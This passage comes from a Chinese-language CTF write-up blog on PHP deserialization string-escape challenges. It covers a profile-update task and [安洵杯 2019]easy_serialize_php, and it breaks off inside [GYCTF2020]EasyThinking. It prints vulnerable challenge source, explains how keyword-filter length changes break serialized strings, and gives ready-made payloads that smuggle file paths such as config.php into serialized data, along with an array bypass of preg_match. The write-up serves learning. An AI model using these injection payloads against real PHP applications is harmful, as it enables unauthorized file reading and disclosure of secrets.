&amp;&amp; $_POST[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; $_FILES[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>profile.php</code>文件中有一个很明显的可以读文件的地方<code>$photo = base64_encode(file_get_contents($profile['photo']));</code>，并且<code>$profile</code>变量是经过反序列化的。那么现在的目标就是要把<code>$profile['photo']</code>的值替换成<code>config.php</code>，<code>update.php</code>中可以控制<code>$profile</code>变量。主要是下面这一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>传入了数组中这四个值，然后将数组序列化后带入user类中的update_profile方法中从而更改表信息。然后我们查看内容时会在<code>profile.php</code>中反序列化后返回给我们要看的信息。再去看一下<code>update_profile</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个防止sql注入的方法，其中他将上面五个sql关键字替换为了hacker。看起来没什么问题，但这却是我们最重要的利用点。</p><blockquote><p>任何具有一定结构的数据，<strong>如果经过了某些处理而把结构体本身的结构给打乱了</strong>，则有可能会产生漏洞。</p></blockquote><p>首先我们看一下一个正常的<code>$profile</code>经过序列化后是什么样子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$profile = a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们更改的信息是要经过序列化存入数据库的，因此如果我们在信息中填入了关键字，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;select&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这样会替换为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:6:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>反序列化会正常执行，因为字符没什么问题，但如果填入了where。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;where&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>会替换为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hacker&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这样就会发现会出错，因为where是五个字符，而hacker是六个，对于出where以外的其他都是六字符，所以只有where会出错，因此这就是我们的利用点。当我们把hacker多余的这个r替换成<code>&quot;;i:1;s:5:&quot;world&quot;;&#125;</code>时，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:5:&quot;hacke&quot;;i:1;s:5:&quot;world&quot;;&#125;&quot;;i:1;s:5:&quot;world&quot;;&#125;</span><br></pre></td></tr></table></figure><p>php反序列化时会忽略后面的非法部分&quot;;i:1;s:5:“world”;}，可以反序列化成功。所以我们可以多写几个where，这样在替换时每多出的一个r就为我们构造字符串提供一个位置，我们需要<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>加在后面用来读config.php文件。共34个字符，因此需要加34的where，所以最后需要输入的数据为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这样在反序列化后大概就是这情况：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>此时这34个字符会包含在204个总字符内。<br>替换为hacker后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;ca01h&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">204</span>:<span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>因为hacker比where多一个字符，所以正好占据了这多余的34个字符，使得其逃逸了出来，便可以成功反序列化。</p><p>payload构造成功了，再找输入点。</p><blockquote><p>md5(Array()) = null<br>sha1(Array()) = null<br>ereg(pattern,Array()) = null<br>preg_match(pattern,Array()) = false<br>strcmp(Array(), “abc”) = null<br>strpos(Array(),“abc”) = null<br>strlen(Array()) = null</p></blockquote><p>下面的这个preg_math可以用数组绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713150607.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713150646.png" alt=""></p><h3 id="参考-v2">参考</h3><p><a href="https://xz.aliyun.com/t/7570#toc-9">https://xz.aliyun.com/t/7570#toc-9</a></p><p><a href="http://www.lin2zhen.top/index.php/archives/73/">http://www.lin2zhen.top/index.php/archives/73/</a></p><h2 id="安洵杯-2019-easy-serialize-php-v2">[安洵杯 2019]easy_serialize_php</h2><h3 id="考点-v10">考点</h3><ul><li>phpinfo信息搜集</li><li>PHP反序列化字符逃逸</li></ul><h3 id="解题-v10">解题</h3><p>上来就直接个源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易看到有一个变量覆盖的漏洞，但是还不知道怎么利用，接着往下看。</p><p>传入<code>f=phpinfo</code>可以看到someting，试试看</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713152851.png" alt=""></p><p>在每个php文件前面都自动包含了<code>d0g3_f1ag.php</code>，直接访问没有任何回显。</p><p>当<code>$function=show_image</code>的时候，会调用<code>file_get_contents</code>函数读取文件内容，如果我们能控制<code>$userinfo['img']</code>参数为<code>d0g3_f1ga.php</code>就可以读flag。</p><p>但是如果传入<code>img_path</code>参数的话会先对其base64编码然后sha1加密，是一个不可逆的操作。</p><p>那么再去看另外两个参数<code>function</code>和<code>user</code>，其中<code>user</code>也是硬编码无法利用，只能从<code>function</code>参数入手。此外，我们还要注意到有一个<code>filter</code>函数用于过滤<code>php</code>、<code>flag</code>、<code>php5</code>、<code>php4</code>和<code>fl1g</code>关键字。</p><blockquote><p>任何具有一定结构的数据，<strong>如果经过了某些处理而把结构体本身的结构给打乱了</strong>，则有可能会产生漏洞。</p></blockquote><p>那么这个地方就可以很明显的用到反序列化字符逃逸的漏洞，用于覆盖<code>$userinfo['img']</code>参数为<code>d0g3_f1ag.php</code>。首先看一下一个正常的序列化后的<code>$_SESSION</code>是什么样子的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">php &gt; $_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">php &gt; $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">php &gt; print_r(serialize($_SESSION));</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们要覆盖掉序列化后的<code>img</code>参数，也就是要插入<code>s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>，即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>这里我们就可以利用变量覆盖漏洞来覆盖<code>$_SESSION[&quot;user&quot;]</code>和<code>$_SESSION[&quot;function&quot;]</code>的值。</p><p>假如我们赋值<code>$_SESSION[&quot;user&quot;]=flagflagflagflagflagflag</code>，<code>$_SESSION[&quot;function&quot;]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</code>，那么序列化后<code>$serialize_info</code>为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:28:&quot;</span>L3VwbG9hZC9ndWVzdF9pbWcuanBn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>过滤之后，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:28:&quot;</span>L3VwbG9hZC9ndWVzdF9pbWcuanBn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>其中<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>刚好是24个字符，这样就可以控制后面的序列化内容。</p><p>所以最终的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image</span><br></pre></td></tr></table></figure><h3 id="参考-v3">参考</h3><p><a href="https://xz.aliyun.com/t/6911#toc-3">官方writeup</a></p><p><a href="https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/">AD攻防实验室——PHP反序列化字符逃逸</a></p><h2 id="GYCTF2020-EasyThinking">[GYCTF2020]EasyThinking</h2><h3 id="考点-v11">考点</h3><ul><li>POP链构造</li><li>PHP反序列化字符逃逸</li></ul><h3 id="解题-v11">解题</h3><p>下载<code>www.zip</code>审计源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>update.php</code>页面提示需要登录才能获得flag。</p><p>主要代码都在<code>lib.php</code>中，先来看一下User类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span 